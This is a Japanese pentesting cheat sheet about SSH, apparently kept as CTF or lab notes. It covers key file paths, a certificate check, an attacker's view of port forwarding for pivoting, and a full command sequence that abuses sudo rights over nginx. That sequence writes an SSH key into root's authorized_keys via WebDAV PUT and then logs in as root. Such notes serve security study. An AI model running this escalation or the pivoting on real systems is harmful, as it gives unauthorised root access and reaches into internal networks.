# ssh
## Path, Filename
```bash
# 秘密鍵
id_rsa, id_dsa, id_ed25519` 
# 公開鍵  
id_rsa.pub, id_dsa.pub, id_ed25519.pub` 
# ファイルパス  
~/.ssh/
# 公開鍵登録パス  
~/.ssh/authorized_keys
```

## 証明書チェック
openssl s_client -connect <Domain>:<Port> -servername <Domain> | openssl x509 -noout -text

## Error
```bash
no mutual signature supported # 署名ルールが一致しないときのエラー
-o PubkeyAcceptedKeyTypes=ssh-rsa # ssh-rsa(sha1)を強制的に使用
```
## Portforwarding
### Local Portforwarding
攻撃者がいるローカルマシン側のポートから、SSHサーバーを経由してリモートネットワーク内部の特定のサービスにアクセスするために使われる。
- 方向: クライアント（ローカル）のポート -> SSHサーバー -> ターゲットサーバー
- 目的: 攻撃者が直接アクセスできない内部ネットワークにあるサービスにアクセスするため
```bash
ssh -L <クライアントのポート>:<ターゲット内部のIP>:<ターゲット内部のポート> <ユーザー名>@<ターゲットのIP>
```
### Remote Portforwarding
ローカルフォワーディングとは逆方向で、外部のユーザーがSSHサーバーを経由してローカルネットワーク内のサービスにアクセスできるようにするために使われる。
- 方向: 外部のユーザー -> SSHサーバー -> クライアント（ローカル）のポート
- 目的: 内部のクライアントが、ファイアウォール越しに外部にサービスを公開するため
```bash
ssh -R <SSHサーバーで公開するポート>:<ターゲットのIP>:<ターゲットのポート> <SSH接続するユーザー名>@<SSHサーバーのIP> # ターゲット側で実行
```
### Dynamic Portforwarding
特定のターゲットを指定せず、SSH接続を介してSOCKSプロキシを構築する
- 方向: クライアント（ローカル）のポート -> SSHサーバー -> 任意の（動的な）リモートサービス
- 目的: トンネルを通過するトラフィックの接続先を動的に決定できるようにし、踏み台サーバーを中間プロキシとして利用するため
```bash
ssh -D 1080 <ユーザー名>@<ターゲットのIP>
```

## ssh, nginx, webDAV
1. nginxを任意の設定ファイルで起動できる権限があれば可能。
2. 攻撃者は以下の設定を含む任意のnginx設定ファイルを作成。
   1. `user root;` nginxをroot権限で実行
   2. `root /;` Webサーバーのドキュメントルートをターゲットのルートに設定
   3. 外部からファイルをアップロードするためのWevDav機能とPUTメソッドを有効化
4. SSHキーペアを生成。
5. WebDAV PUTメソッドを利用して生成した公開鍵を`/root/.ssh/authorized_keys`に書き込む。
6. rootのSSH設定が書き換えられたため、攻撃者は生成した秘密鍵によりrootとしてsshログインが可能。
```bash
touch /tmp/pwn.conf
# pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
  worker_connections 768;
}
http {
  server {
    listen 1337;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
sudo /usr/sbin/nginx -c /tmp/pwn.conf
ss -tlnp # 1337が開いているかどうか確認
ssh-keygen # ./rootに生成
ls # rootとroot.pubがあるのを確認
curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)" # WebDAV PUTメソッドで公開鍵を登録
ssh -i root root@localhost
```

